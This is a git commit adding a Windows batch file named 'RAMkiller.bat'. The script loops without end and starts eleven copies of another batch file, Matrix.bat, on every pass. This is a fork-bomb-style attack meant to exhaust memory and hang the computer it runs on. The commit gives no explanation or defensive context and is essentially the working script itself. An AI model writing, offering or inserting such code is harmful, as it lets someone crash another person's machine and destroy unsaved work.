b52aaa39a0d531052157d4045d7ef0bf1e4ce7a3
Tien Vu <timothyvu2002@gmail.com>
2016-12-01 13:19:29 -0500

    Add files via upload

---
+++ RAMkiller.bat
@@ -0,0 +1,20 @@
+title Matrix
+color 0a
+:1
+
+type RAMK.txt
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+start Matrix.bat
+
+goto 1
+
+stop
